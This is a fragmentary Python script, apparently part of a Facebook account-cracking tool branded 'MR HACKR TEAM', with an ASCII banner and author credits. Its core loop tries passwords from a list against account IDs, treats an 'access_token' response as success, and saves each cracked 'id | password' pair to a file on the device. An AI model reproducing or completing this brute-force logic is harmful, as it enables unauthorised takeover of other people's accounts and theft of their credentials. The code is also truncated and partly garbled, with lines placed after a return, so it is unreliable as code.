...
def tanim():
        ...
        return ua
        os.system('xdg-open https://t.me/MR_HACKR_TEAM')
logo= (""" 
███╗   ███╗ █████╗ ██╗  ██╗██╗███╗   ██╗
████╗ ████║██╔══██╗██║  ██║██║████╗  ██║
██╔████╔██║███████║███████║██║██╔██╗ ██║
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR HACKR TEAM]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • KIB MAHIN    ║  \033[1;97m  
╠══[Github                   •  RRR-KING║\33[1;34m   
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                oks.append(ids)
                open('/sdcard/MAHIN-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
